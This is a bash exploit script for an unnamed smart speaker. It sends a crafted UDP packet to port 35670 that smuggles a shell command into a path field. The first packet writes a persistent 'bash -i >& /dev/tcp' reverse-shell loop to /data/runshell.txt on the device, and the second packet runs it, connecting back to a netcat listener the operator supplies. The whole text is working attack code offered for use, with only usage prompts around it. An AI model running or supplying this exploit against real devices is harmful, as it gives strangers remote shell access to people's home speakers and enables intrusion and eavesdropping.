#!/bin/bash
#
#

which socat || { echo "Socat not found - please apt install socat"; exit 1; }
which xxd || { echo "xxd not found - please apt install xxd (or vim-common) to view payloads"; exit 1; }


test -z "$1" && { echo "Second argument should be the IP address of the smart speaker; use nmap to find it"; exit 1; }
SPEAKER_IP="$1"

test -z "$2" && { echo "Second argument should be an IP address to connect, such as your own, running nc -l"; exit 1; }
test -z "$3" && { echo "Third argument should be a port address to connect"; exit 1; }

echo "Please run 'nc -l -p $3 on the machine with IP address $2, make sure it is not firewalled!"
echo
echo Press ENTER to continue

read -r dummy

COMMAND='"$(echo '"'"'while true ; do bash -i >& /dev/tcp/'$2'/'$3' 0>&1 ; sleep 1 ; done'"'"' > /data/runshell.txt &)"'
echo "RCE COMMAND:"
echo -n $COMMAND | xxd
echo
echo "UDP PAYLOAD:"
echo -n -e '\x13\00\00\00\00\00\00\00\x94\00\00\00/'${COMMAND}'/\00'$(for x in $(seq 1 $((125 - ${#COMMAND}))) ; do echo -n -e a ; done)'ignored\00' | xxd
echo -n -e '\x13\00\00\00\00\00\00\00\x94\00\00\00/'${COMMAND}'/\00'$(for x in $(seq 1 $((125 - ${#COMMAND}))) ; do echo -n -e a ; done)'ignored\00' | socat - udp4:$SPEAKER_IP:35670

COMMAND='"$(bash /data/runshell.txt &)"'
echo "RCE COMMAND:"
echo -n $COMMAND | xxd
echo
echo "UDP PAYLOAD:"
echo -n -e '\x13\00\00\00\00\00\00\00\x94\00\00\00/'${COMMAND}'/\00'$(for x in $(seq 1 $((125 - ${#COMMAND}))) ; do echo -n -e a ; done)'ignored\00' | xxd
echo -n -e '\x13\00\00\00\00\00\00\00\x94\00\00\00/'${COMMAND}'/\00'$(for x in $(seq 1 $((125 - ${#COMMAND}))) ; do echo -n -e a ; done)'ignored\00' | socat - udp4:$SPEAKER_IP:35670

echo "Payload sent... check netcat server"
echo

